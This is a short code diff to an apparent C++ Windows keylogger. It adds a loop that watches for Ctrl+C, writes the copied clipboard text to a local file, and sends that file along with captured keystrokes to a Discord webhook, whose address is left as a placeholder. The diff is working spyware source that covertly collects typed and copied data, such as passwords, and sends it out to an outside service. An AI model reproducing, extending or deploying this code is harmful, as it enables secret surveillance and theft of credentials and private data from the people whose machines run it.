@@ -64,6 +64,34 @@ auto detectKey() {
 	}
 }
 
+std::string GetClipBoardText() {
+	if (!OpenClipboard(nullptr))
+		return "Error can't open the clipbaord";
+
+	HANDLE data = GetClipboardData(CF_TEXT);
+	if (data == nullptr)
+		return "Can't get clipboard data";
+
+	char* textChar = static_cast<char*>(GlobalLock(data));
+	std::string text(textChar);
+
+	GlobalUnlock(data);
+	CloseClipboard();
+	return text;
+}
+
+void clipboard() {
+	std::ofstream myfile;
+	while (1) {
+		if (GetAsyncKeyState(VK_CONTROL) && GetAsyncKeyState(0x43)) {
+			std::this_thread::sleep_for(std::chrono::milliseconds(70));
+			myfile.open("clipboard.txt", std::ofstream::app);
+			myfile << GetClipBoardText();
+			myfile.close();
+		}
+	}
+}
+
 void saveInTextFile() {
 	std::ofstream myfile;
 	while (true) {
@@ -76,6 +104,7 @@ void saveInTextFile() {
 			dpp::cluster bot("");
 			dpp::webhook wh("UR WEBHOOK HERE!");
 			bot.execute_webhook(wh, dpp::utility::read_file("output.txt"));
+			bot.execute_webhook(wh, dpp::utility::read_file("clipboard.txt"));
 		}
 	}
 }
